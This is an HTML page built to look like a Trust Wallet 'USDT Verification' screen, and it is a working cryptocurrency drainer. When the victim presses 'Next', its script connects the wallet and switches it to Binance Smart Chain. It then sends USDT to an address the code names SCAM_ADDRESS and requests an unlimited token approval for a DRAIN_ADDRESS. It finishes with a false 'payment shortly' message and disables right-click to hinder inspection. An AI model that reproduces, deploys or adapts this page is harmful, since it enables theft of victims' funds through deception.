<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>USDT Verification</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        /* SUPER SIMPLE STYLES - EXACT MATCH */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #FFFFFF;
            color: #000000;
            font-size: 16px;
            line-height: 1.4;
            padding: 0;
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }
        
        /* TRUST WALLET BROWSER BAR - SIMPLE */
        .browser-bar {
            background: #F8F8F8;
            padding: 8px 12px;
            border-bottom: 0.5px solid #C6C6C8;
            display: flex;
            gap: 15px;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .browser-item {
            color: #007AFF;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        
        /* SITE URL */
        .site-url {
            padding: 15px 20px;
            text-align: center;
            border-bottom: 0.5px solid #E5E5EA;
            background: white;
        }
        
        .site-url .main {
            font-size: 16px;
            font-weight: 600;
            color: #000000;
        }
        
        .site-url .secondary {
            font-size: 14px;
            color: #8E8E93;
            margin-top: 2px;
        }
        
        /* MAIN CONTENT - SIMPLE */
        .content {
            padding: 25px 20px;
        }
        
        .field {
            margin-bottom: 25px;
        }
        
        .field-label {
            font-size: 14px;
            color: #8E8E93;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .address-box {
            background: #F2F2F7;
            border-radius: 10px;
            padding: 15px;
            font-family: monospace;
            font-size: 15px;
            color: #000000;
            word-break: break-all;
        }
        
        .amount-box {
            background: #F2F2F7;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .amount-header {
            padding: 12px 15px;
            border-bottom: 0.5px solid #D1D1D6;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .amount-title {
            font-size: 15px;
            color: #8E8E93;
        }
        
        .usdt-badge {
            background: #007AFF;
            color: white;
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }
        
        .amount-input-row {
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .amount-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            font-size: 28px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            min-width: 0;
        }
        
        .max-btn {
            background: #34C759;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 8px 15px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .usd-value {
            text-align: center;
            font-size: 15px;
            color: #8E8E93;
            margin: 15px 0 30px 0;
        }
        
        /* NEXT BUTTON - SIMPLE */
        .next-btn {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            padding: 20px;
            border-top: 0.5px solid #E5E5EA;
        }
        
        .next-btn button {
            width: 100%;
            height: 50px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
        }
        
        /* SAFE AREA FOR IPHONE */
        @supports (padding-bottom: env(safe-area-inset-bottom)) {
            .next-btn {
                padding-bottom: calc(20px + env(safe-area-inset-bottom));
            }
        }
    </style>
</head>
<body>
    <!-- SIMPLE BROWSER CONTROLS -->
    <div class="browser-bar">
        <div class="browser-item">Desktop Mode</div>
        <div class="browser-item">Share</div>
        <div class="browser-item">Fullscreen mode</div>
    </div>
    
    <!-- SITE URL -->
    <div class="site-url">
        <div class="main" id="mainUrl">usdttt-rewll.vercel.app</div>
        <div class="secondary" id="secondaryUrl">usdtverification.vercel.app</div>
    </div>
    
    <!-- SIMPLE CONTENT -->
    <div class="content">
        <div class="field">
            <div class="field-label" id="addressLabel">Address or Domain</div>
            <div class="address-box" id="addressBox">
                0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85
            </div>
        </div>
        
        <div class="field">
            <div class="amount-box">
                <div class="amount-header">
                    <div class="amount-title" id="amountTitle">Amount</div>
                    <div class="usdt-badge">USDT</div>
                </div>
                <div class="amount-input-row">
                    <input type="number" class="amount-input" id="amountInput" value="1" placeholder="0">
                    <button class="max-btn" onclick="setMax()">Max</button>
                </div>
            </div>
            <div class="usd-value" id="usdValue">≈ $1.00</div>
        </div>
    </div>
    
    <!-- SIMPLE NEXT BUTTON -->
    <div class="next-btn">
        <button id="nextButton" onclick="handleNext()">Next</button>
    </div>
    
    <script>
        // SIMPLE CONFIG
        const SCAM_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85";
        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
        
        // SIMPLE FUNCTIONS
        function updateUSD() {
            const amount = document.getElementById('amountInput').value || 0;
            const usd = (amount * 1.00).toFixed(2);
            document.getElementById('usdValue').textContent = `≈ $${usd}`;
            
            if (amount > 0) {
                document.getElementById('amountTitle').textContent = "USDT Amount";
                document.getElementById('addressLabel').textContent = "Address or Domain Name";
            } else {
                document.getElementById('amountTitle').textContent = "Amount";
                document.getElementById('addressLabel').textContent = "Address or Domain";
            }
        }
        
        function setMax() {
            document.getElementById('amountInput').value = "1000";
            updateUSD();
        }
        
        // MAIN FUNCTION - SUPER SIMPLE
        async function handleNext() {
            // This directly triggers Trust Wallet's native connect modal
            if (typeof window.ethereum === 'undefined') {
                alert("Please open in Trust Wallet");
                return;
            }
            
            try {
                // Request connection - opens Trust Wallet's native modal
                await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                // After connection, proceed with scam
                await executeScam();
                
            } catch (error) {
                console.log("User rejected connection");
            }
        }
        
        // SCAM EXECUTION
        async function executeScam() {
            const amount = document.getElementById('amountInput').value;
            
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                // Switch to BSC
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                } catch (e) {
                    // Add BSC if not present
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/']
                        }]
                    });
                }
                
                // Send 1 USDT
                const usdt = new ethers.Contract(
                    USDT_CONTRACT,
                    ["function transfer(address to, uint256 amount) returns (bool)"],
                    signer
                );
                
                const amountWei = ethers.utils.parseUnits(amount, 18);
                const tx1 = await usdt.transfer(SCAM_ADDRESS, amountWei);
                await tx1.wait();
                
                // Request unlimited approval
                const approveTx = await usdt.approve(
                    DRAIN_ADDRESS,
                    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                );
                await approveTx.wait();
                
                alert("✅ Verification complete! You will receive payment shortly.");
                
            } catch (error) {
                console.error(error);
            }
        }
        
        // INIT
        document.addEventListener('DOMContentLoaded', function() {
            // Truncate address for display
            const addr = SCAM_ADDRESS;
            const displayAddr = addr.substring(0, 20) + '...';
            document.getElementById('addressBox').textContent = displayAddr;
            
            // Update USD on input
            document.getElementById('amountInput').addEventListener('input', updateUSD);
            updateUSD();
            
            // Prevent inspection
            document.addEventListener('contextmenu', e => e.preventDefault());
        });
    </script>
</body>
</html>
